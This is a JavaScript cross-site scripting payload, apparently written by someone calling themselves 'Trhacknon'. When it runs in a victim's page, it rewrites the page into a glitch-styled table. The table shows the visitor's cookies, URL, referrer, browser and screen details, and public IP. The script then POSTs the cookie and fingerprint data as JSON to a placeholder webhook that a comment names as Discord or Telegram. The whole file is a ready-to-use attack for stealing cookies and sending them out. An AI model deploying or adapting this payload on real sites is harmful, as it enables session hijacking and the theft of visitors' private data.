document.body.innerHTML = `
<style>
@keyframes glitch { 
  0% { text-shadow: 2px 2px lime, -2px -2px cyan; } 
  50% { text-shadow: -2px -2px lime, 2px 2px cyan; } 
  100% { text-shadow: 2px 2px lime, -2px -2px cyan; } 
}
body { 
  background: black; 
  color: lime; 
  text-align: center; 
  font-family: 'Courier New', monospace;
}
h2 { 
  animation: glitch 1s infinite alternate; 
  font-size: 28px;
  text-transform: uppercase;
}
.container {
  width: 90%;
  margin: auto;
  padding: 20px;
  border: 2px solid lime;
  box-shadow: 0 0 10px lime;
  text-align: left;
  background: rgba(0, 0, 0, 0.9);
}
table { 
  width: 100%; 
  margin: auto; 
  border-collapse: collapse; 
}
th, td { 
  border: 1px solid lime; 
  padding: 10px; 
  text-align: left; 
}
th { 
  background: darkgreen; 
  color: white; 
}
</style>

<h2>🔥 XSS by Trhacknon 🔥</h2>
<div class="container">
  <table>
    <tr><th>🔑 Clé</th><th>📊 Valeur</th></tr>
    <tbody id="infoTable"></tbody>
  </table>
</div>
`;

const data = [
  { key: '🍪 COOKIE', value: document.cookie },
  { key: '🌐 DOMAIN', value: document.domain },
  { key: '📌 URL', value: window.location.href },
  { key: '📖 REFERRER', value: document.referrer || 'Aucun' },
  { key: '📄 TITRE', value: document.title },
  { key: '🖥 UserAgent', value: navigator.userAgent },
  { key: '🛠 AppVersion', value: navigator.appVersion },
  { key: '💻 PLATFORM', value: navigator.platform },
  { key: '🖼 Screen', value: screen.width + 'x' + screen.height },
  { key: '🎨 Couleurs', value: screen.colorDepth + '-bit' },
  { key: '🔘 CookieEnabled', value: navigator.cookieEnabled },
  { key: '📡 Online', value: navigator.onLine },
  { key: '🌍 LANGUAGE', value: navigator.language },
  { key: '⏳ Temps chargement', value: performance.now().toFixed(2) + ' ms' },
  { key: '🚫 AdBlock', value: 'Vérification...' },
  { key: '🕵️ IP PUBLIC', value: 'Chargement...' }
];

// Affichage dynamique
const table = document.getElementById('infoTable');
data.forEach(d => {
  const row = `<tr><td>${d.key}</td><td>${d.value}</td></tr>`;
  table.innerHTML += row;
});

// 📡 Récupération de l'IP publique
fetch('https://api64.ipify.org?format=json')
  .then(res => res.json())
  .then(data => {
    table.innerHTML += `<tr><td>🕵️ IP PUBLIC</td><td>${data.ip}</td></tr>`;
  });

// 🚫 Détection AdBlock
fetch('https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js', { method: 'HEAD' })
  .then(() => {
    table.innerHTML += `<tr><td>🚫 AdBlock</td><td>Non</td></tr>`;
  })
  .catch(() => {
    table.innerHTML += `<tr><td>🚫 AdBlock</td><td>Oui</td></tr>`;
  });

// 📩 Envoi vers un Webhook (Discord/Telegram)
const webhookURL = 'https://ton-webhook.com';
const infos = {
  cookie: document.cookie,
  domaine: document.domain,
  url: window.location.href,
  referrer: document.referrer,
  titre: document.title,
  userAgent: navigator.userAgent,
  appVersion: navigator.appVersion,
  platform: navigator.platform,
  screen: screen.width + 'x' + screen.height,
  couleurs: screen.colorDepth + '-bit',
  cookieEnabled: navigator.cookieEnabled,
  online: navigator.onLine,
  langue: navigator.language,
  tempsChargement: performance.now().toFixed(2) + ' ms',
};

fetch('https://api64.ipify.org?format=json')
  .then(res => res.json())
  .then(data => {
    infos.ipPublic = data.ip;
    fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(infos),
    });
  });
